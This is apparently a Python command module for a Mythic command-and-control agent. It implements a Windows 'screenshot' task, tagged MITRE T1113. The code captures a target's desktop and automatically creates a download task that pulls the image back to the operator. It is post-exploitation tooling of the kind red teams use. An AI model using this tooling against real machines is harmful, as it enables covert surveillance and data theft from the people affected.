from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio
import json

class ScreenshotArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot"
    description = "Take a screenshot of the current desktop."
    version = 1
    author = "@checkymander"
    argument_class = ScreenshotArguments
    browser_script = BrowserScript(script_name="screenshot", author="@checkymander", for_new_ui=True)
    attackmapping = ["T1113"]  # Screen Capture
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows]  # Windows only for this implementation
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        response.DisplayParams = "Taking screenshot of desktop"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        """
        Process the agent response from screenshot command (Apollo's approach)
        """
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        
        try:
            print(f"DEBUG: Screenshot response type: {type(response)}")
            print(f"DEBUG: Screenshot response content: {response}")
            
            # Handle both string and JSON responses from agent
            if isinstance(response, dict):
                if "user_output" in response:
                    # Agent returned JSON format from mythic_success!: {"status": "success", "user_output": "..."}
                    response_text = str(response["user_output"])
                    print(f"DEBUG: Extracted user_output: {response_text}")
                elif "output" in response:
                    # Agent returned JSON format: {"status": "success", "output": "..."}
                    response_text = str(response["output"])
                    print(f"DEBUG: Extracted output: {response_text}")
                else:
                    # Fallback: convert entire response to string
                    response_text = str(response)
                    print(f"DEBUG: Using entire response as string: {response_text}")
            else:
                # Agent returned plain string (our current format)
                response_text = str(response)
                print(f"DEBUG: Using plain string response: {response_text}")
            
            if response_text:
                print(f"DEBUG: Processing response_text: {response_text}")
                # Check if the response contains our special format for screenshot (Apollo's approach)
                if response_text.startswith("screenshot_captured:"):
                    print(f"DEBUG: Detected screenshot_captured format")
                    # Parse the response: format is "screenshot_captured:file_path:file_size:filename:type"
                    parts = response_text.split(":")
                    if len(parts) >= 4:
                        file_path = parts[1]
                        file_size = parts[2]
                        filename = parts[3]
                        file_type = parts[4] if len(parts) > 4 else "screenshot"
                        
                        print(f"DEBUG: Parsed screenshot info - Path: {file_path}, Size: {file_size}, Filename: {filename}")
                        
                        # Create a download task tree for the screenshot automatically (Apollo's approach)
                        try:
                            download_task = await SendMythicRPCTaskCreate(MythicRPCTaskCreateMessage(
                                TaskID=task.Task.ID,
                                CommandName="download",
                                Parameters=json.dumps({"file": file_path}),
                                CallbackID=task.Callback.ID
                            ))
                            
                            print(f"DEBUG: Download task creation result: Success={download_task.Success}")
                            
                            if download_task.Success:
                                print(f"DEBUG: Download task created successfully")
                                # Try to get the child task id (be robust to field names)
                                child_task_id = getattr(download_task, 'TaskID', None)
                                if child_task_id is None and hasattr(download_task, 'task'):
                                    child_task_id = getattr(download_task.task, 'id', None)

                                # Poll Mythic for the created file so we can return file_id to the browser script
                                found_file_id = None
                                for _ in range(10):
                                    try:
                                        file_search = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                                            TaskID=child_task_id
                                        ))
                                        if file_search.Success and len(file_search.Files) > 0:
                                            f = file_search.Files[0]
                                            # Robustly extract agent_file_id
                                            found_file_id = (
                                                getattr(f, 'AgentFileId', None)
                                                or getattr(f, 'AgentFileID', None)
                                                or getattr(f, 'agent_file_id', None)
                                            )
                                            if found_file_id:
                                                break
                                    except Exception as ie:
                                        print(f"DEBUG: File search polling error: {ie}")
                                    await asyncio.sleep(1)

                                if found_file_id:
                                    response_data = {
                                        "file_id": found_file_id,
                                        "filename": filename,
                                        "file_size": file_size,
                                        "message": f"Screenshot captured successfully! File: {filename} ({file_size} bytes)"
                                    }
                                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                                        TaskID=task.Task.ID,
                                        Response=json.dumps(response_data).encode()
                                    ))
                                else:
                                    # Fallback: indicate download task created; UI will show plaintext
                                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                                        TaskID=task.Task.ID,
                                        Response=f"Screenshot captured: {filename} ({file_size} bytes)\nCreated download task; image will appear when complete.".encode()
                                    ))
                            else:
                                # Fallback: manual download instructions
                                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                                    TaskID=task.Task.ID,
                                    Response=f"Screenshot captured: {filename} ({file_size} bytes)\n\nTo download manually, use: download {file_path}".encode()
                                ))
                        except Exception as e:
                            # Fallback on error
                            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                                TaskID=task.Task.ID,
                                Response=f"Screenshot captured: {filename} ({file_size} bytes)\n\nTo download manually, use: download {file_path}\nError: {str(e)}".encode()
                            ))
                    else:
                        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                            TaskID=task.Task.ID,
                            Response=f"Screenshot captured but failed to parse file information. Raw response: {response_text}".encode()
                        ))
                elif response_text.startswith("error:"):
                    # Handle error responses from agent
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=task.Task.ID,
                        Response=response_text.encode()
                    ))
                else:
                    # Regular response (might be the screenshot_captured string shown directly)
                    print(f"DEBUG: Unexpected response format: {response_text}")
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=task.Task.ID,
                        Response=response_text.encode()
                    ))
            else:
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response="No response received from agent".encode()
                ))
                
        except Exception as e:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=f"Error processing screenshot response: {str(e)}".encode()
            ))
            resp.Success = False
            resp.Error = str(e)
            
        return resp